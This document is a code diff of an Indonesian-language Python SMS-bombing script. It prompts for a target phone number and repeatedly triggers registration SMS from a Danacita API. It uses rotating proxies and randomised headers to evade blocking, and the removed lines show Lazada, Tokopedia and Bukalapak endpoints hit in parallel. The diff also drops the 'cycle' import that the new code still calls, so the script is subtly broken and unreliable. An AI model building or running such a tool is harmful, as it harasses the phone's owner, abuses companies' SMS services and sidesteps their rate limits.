@@ -1,15 +1,10 @@
-import requests
+import aiohttp
+import asyncio
 import json
-import time
 import random
 import uuid
 import logging
 from colorama import Fore, init
-import sys
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from itertools import cycle
-import aiohttp
-import asyncio
 
 init(autoreset=True)
 
@@ -52,7 +47,7 @@ def generate_sec_ch_ua_platform():
     platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
     return f"\"{random.choice(platforms)}\""
 
-def generate_headers(api_name):
+def generate_headers():
     return {
         "Accept": "application/json, text/plain, */*",
         "Accept-Encoding": "gzip, deflate, br, zstd",
@@ -102,33 +97,32 @@ async def fetch_proxies():
         logging.error(f"Terjadi kesalahan saat mengambil daftar proxy: {e}")
     return []
 
+async def send_sms(api_url, session, proxy_list):
+    headers = generate_headers()
+    data = json.dumps({"username": inputNomer})
+
+    for proxy in cycle(proxy_list):
+        if await send_request(api_url, headers, data, session, proxy):
+            break
+        # Delay antara penggunaan proxy
+        await asyncio.sleep(random.randint(1, 5))
+
 async def main():
     # Input nomor
+    global inputNomer
     inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")    
 
-    # API endpoints
-    api_endpoints = {
-        "Danacita": "https://api.danacita.co.id/v4/users/mobile_register/",
-        "Lazada": "https://api.lazada.co.id/v1/sms/verify/",
-        "Tokopedia": "https://api.tokopedia.com/v1/sms/verification/",
-        "Bukalapak": "https://api.bukalapak.com/v1/sms/verification/"
-    }
+    # API endpoint
+    api_url = "https://api.danacita.co.id/v4/users/mobile_register/"
 
-    # Parallel processing parameters
-    num_threads = 20
+    # Fetch proxies
     proxy_list = await fetch_proxies()
-    proxies = cycle(proxy_list) if proxy_list else cycle([])
-
+    if not proxy_list:
+        print(f"{RedTerm}Gagal mengambil daftar proxy.")
+        return
+    
     async with aiohttp.ClientSession() as session:
-        tasks = []
-        for _ in range(num_threads):
-            for api_name, api_url in api_endpoints.items():
-                proxy = next(proxies, None)
-                task = asyncio.ensure_future(send_request(api_url, generate_headers(api_name), json.dumps({"username": inputNomer}), session, proxy))
-                tasks.append(task)
-        
-        # Execute tasks concurrently
-        await asyncio.gather(*tasks)
+        await send_sms(api_url, session, proxy_list)
 
 # Run the main function
 asyncio.run(main())
